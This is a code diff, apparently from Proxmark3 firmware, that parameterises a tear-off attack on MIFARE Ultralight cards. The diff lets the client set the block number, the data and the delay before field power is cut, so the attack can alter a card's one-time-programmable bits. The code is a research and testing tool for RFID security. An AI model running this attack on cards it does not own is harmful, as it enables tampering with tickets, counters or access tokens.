@@ -2423,12 +2423,14 @@ void Mifare_DES_Auth2(uint32_t arg0, uint8_t *datain) {
 //
 // Tear-off attack against MFU.
 // - Moebius et al
-void MifareU_Otp_Tearoff() {
-
-// should the
-// optional time be configurable via client side?
+void MifareU_Otp_Tearoff(uint8_t arg0, uint32_t arg1, uint8_t *datain) {
+    uint8_t blockNo = arg0;
+    uint32_t tearOffTime = arg1;
+    uint8_t data_fullwrite[4] = {0x00};
+    uint8_t data_testwrite[4] = {0x00};
+    memcpy(data_fullwrite, datain, 4);
+    memcpy(data_testwrite, datain + 4, 4);
 // optional authentication before?
-// optional data to be written?
 
     if (DBGLEVEL >= DBG_ERROR) DbpString("Preparing OTP tear-off");
 
@@ -2439,46 +2441,26 @@ void MifareU_Otp_Tearoff() {
 
     StartTicks();
 
-#define OTP_TEAR_OFF_TIME 1000
-#define OTP_BLK_NO 3
-
     // write cmd to send, include CRC
     // 1b write, 1b block, 4b data, 2 crc
-    uint8_t cmd[] = {MIFARE_ULC_WRITE, OTP_BLK_NO, 0xFF, 0xFF, 0xFF, 0xFF, 0, 0};
+    uint8_t cmd[] = {MIFARE_ULC_WRITE, blockNo, data_testwrite[0], data_testwrite[1], data_testwrite[2], data_testwrite[3], 0, 0};
 
-// User specific data to write?
-//    memcpy(block + 2, blockData, 4);
+    MifareUWriteBlock(blockNo, 0, data_fullwrite);
 
     AddCrc14A(cmd, sizeof(cmd) - 2);
-
     if (DBGLEVEL >= DBG_ERROR) DbpString("Transmitting");
-
     // anticollision / select card
     if (!iso14443a_select_card(NULL, NULL, NULL, true, 0, true)) {
         if (DBGLEVEL >= DBG_ERROR) Dbprintf("Can't select card");
         OnError(1);
         return;
     };
-
-    /*
-    // UL-EV1 / NTAG authentication
-    if (usePwd) {
-        uint8_t pwd[4] = {0x00};
-        memcpy(pwd, datain + 4, 4);
-        uint8_t pack[4] = {0, 0, 0, 0};
-        if (!mifare_ul_ev1_auth(pwd, pack)) {
-            OnError(1);
-            return;
-        }
-    }
-    */
-
     // send
     ReaderTransmit(cmd, sizeof(cmd), NULL);
 
     // Wait before cutting power.  aka tear-off
     LED_D_ON();
-    WaitUS(OTP_TEAR_OFF_TIME);
+    WaitUS(tearOffTime);
     switch_off();
 
     reply_ng(CMD_HF_MFU_OTP_TEAROFF, PM3_SUCCESS, NULL, 0);
